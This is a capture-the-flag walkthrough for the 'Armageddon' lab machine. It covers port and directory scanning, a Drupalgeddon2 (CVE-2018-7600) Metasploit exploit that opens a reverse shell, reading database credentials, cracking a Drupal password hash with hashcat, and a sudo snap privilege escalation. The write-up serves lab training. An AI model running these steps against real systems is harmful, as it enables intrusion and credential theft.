Armageddon
-------
  ![e](https://i.ibb.co/kcG1Btf/armageddon.png)
  \
  \
**NMAP Scan**
```
$nmap -sV -vv 10.10.10.233

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.4 (protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) <- let's go
```
**Gobuster scan** (common.txt)
```
$gobuster dir -w common.txt -u 10.10.10.233

/.gitignore           (Status: 200) [Size: 174]
/.hta                 (Status: 403) [Size: 206]
/.htaccess            (Status: 403) [Size: 211]
/.htpasswd            (Status: 403) [Size: 211]
/cgi-bin/             (Status: 403) [Size: 210]
/includes             (Status: 301) [Size: 237] [--> http://10.10.10.233/includes/]
/index.php            (Status: 200) [Size: 7440]                                   
/misc                 (Status: 301) [Size: 233] [--> http://10.10.10.233/misc/]    
/modules              (Status: 301) [Size: 236] [--> http://10.10.10.233/modules/] 
/profiles             (Status: 301) [Size: 237] [--> http://10.10.10.233/profiles/]
/robots.txt           (Status: 200) [Size: 2189]                                   
/scripts              (Status: 301) [Size: 236] [--> http://10.10.10.233/scripts/] 
/sites                (Status: 301) [Size: 234] [--> http://10.10.10.233/sites/]   
/themes               (Status: 301) [Size: 235] [--> http://10.10.10.233/themes/]  
/web.config           (Status: 200) [Size: 2200]                                   
/xmlrpc.php           (Status: 200) [Size: 42] 
```
- With wappalyzer (or you can check directory listing), we can see it is using drupal. Drupal uses **/CHANGELOG.txt** for writing changes.

```
GET /CHANGELOG.txt

Drupal 7.56, 2017-06-21
-----------------------
- Fixed security issues (access bypass). See SA-CORE-2017-003.
```
- As we can see, it is using old version of Drupal (CVE-2018-7600), so let's go exploit it!


**Exploit**

We can exploit it via metasploit module `unix/webapp/drupal_drupalgeddon2`, i tried to do it manually, but i was unable to (sorry)

```
search drupalgeddon
use 0
set RHOSTS 10.10.10.233
set LHOST <your ip>
exploit
```
We've got our shell. Note, that meterpreter has not normal commands, so just type `shell`. Metasploit shell sucks, i know.

- after some time, i was able to find credentials of mysql in `/var/www/html/sites/default/` - just read, one of the files contains password and username ;)
\
\

In the mysql database, it's obvious what to do (if you carefully read the file ;)) - BUT! this was pretty amazing since my commands were not working, it was working after i typed wrong syntax lmao.
```https://i.ibb.co/kcG1Btf/armageddon.png
use [name]
show * from users;
eh
;  <---- after this, i've got syntax error and hashed password with the username showed up
```
- I'm gonna gonna use hashcat for this task. $S$ is Drupal7 (7900), so the command will be\
`hashcat -a 0 -m 7900 [file with hash] [wordlist] (rockyou is enough)`
 ```
 $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:password
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Drupal7
Hash.Target......: $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
```
  we can log into ssh and get our user flag. :)
\
\
\
**Privesc**
- now for the escalation part. let's try `sudo -l`. (it is the first thing i do and you should too)
```
User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```
- This was really interesting privesc -> https://notes.vulndev.io/notes/redteam/privilege-escalation/misc-1 -- you will find the instructions there. 

thanks.
